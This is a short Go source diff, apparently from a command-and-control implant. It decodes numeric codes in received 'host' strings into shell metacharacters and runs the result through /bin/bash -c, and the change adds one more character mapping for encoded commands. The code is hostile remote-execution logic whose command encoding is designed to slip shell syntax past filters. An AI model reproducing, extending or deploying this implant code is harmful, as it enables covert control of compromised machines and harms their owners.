@@ -49,7 +49,7 @@ func resolveCommand(host []string, bl *int) {
 
 		// List directory command has been received
 		case trigger_mappings["bash"]:
-			replacement_mappings := map[string]string{"80": "..", "79": ".", "78": "|", "77": ";", "76": "'", "75": ">", "74": "/"}
+			replacement_mappings := map[string]string{"80": "..", "79": ".", "78": "|", "77": ";", "76": "'", "75": ">", "74": "/", "73": "-"}
 			// https://www.sohamkamani.com/golang/exec-shell-command/
 			var mode string = "c2"
 			command := strings.Split(sections[0], "-")[2]
@@ -68,6 +68,7 @@ func resolveCommand(host []string, bl *int) {
 				bash_command = fmt.Sprintf("%v %v", command, bash_command)
 
 			}
+
 			cmd := exec.Command("/bin/bash", "-c", bash_command)
 			out, err := cmd.Output()
 			if err != nil {
